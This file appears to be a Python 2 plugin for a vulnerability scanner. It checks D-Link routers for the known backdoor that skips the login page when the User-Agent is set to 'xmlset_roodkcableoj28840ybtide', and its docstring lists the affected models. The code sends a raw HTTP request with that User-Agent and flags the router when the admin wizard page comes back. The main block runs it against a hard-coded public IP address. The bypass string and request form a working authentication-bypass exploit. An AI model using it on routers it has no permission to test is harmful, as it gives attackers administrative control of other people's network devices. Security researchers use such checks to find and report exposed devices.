#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2015-05-04 17:42:09
# @Author  : Medici.Yan (Medici.Yan@gmail.com)
# @Link    : http://mediciyan.tk
''''
D-Link 路由器的后门，可以不用输入用户名和密码直接登录进管理页面

Simply by configuring your browser's User Agent setting to "xmlset_roodkcableoj28840ybtide", 
you could skip the router's login page and thus administer the router without knowing the password.
Affected models included 

DIR-100, DIR-120, DI-524, DI-524UP, DI-604S, DI-604UP, DI-604 +, TM-G5240, BRL-04R, BRL-04UR,
BRL-04CW, BRL-04FWU.

参考：
https://www.schneier.com/blog/archives/2013/10/d-link_router_b.html
'''

import urlparse
import socket
def assign(service, arg):
    if service == 'www':
        arr = urlparse.urlparse(arg)
        if arr.scheme == 'http':
            return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
    arr = urlparse.urlparse(arg)
    port=80
    host=arr.netloc
    if ':' in host:
        host_port=host.split(':')
        host=host_port[0]
        port=int(host_port[1])
    doGet(host,port)

def doGet(host,port):
    if host=='':
        return
    if port!=80:
        host_port="%s:%s"%(host,str(port))
    else:
        host_port=host

    payload='GET / HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, sdch\r\nAccept-Language: zh-CN,zh;q=0.8,en;q=0.6\r\nUser-Agent: xmlset_roodkcableoj28840ybtide\r\nReferer:http://%s/\r\n\r\n' % (host_port,host_port)
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        socket.setdefaulttimeout(20)#超时
        s.connect((host,port))#连接对应主机和端口
        s.send(payload)
        data=s.recv(1024)
        if 'Home/h_wizard.htm' in data:
            security_hole('D-Link Router Backdoor: http://%s/'%(host_port))
    except Exception,e:
        pass
    finally:
        s.close()
if __name__ == '__main__':
    from dummy import *
    audit(assign('www', 'http://217.196.55.96:8080/')[1])
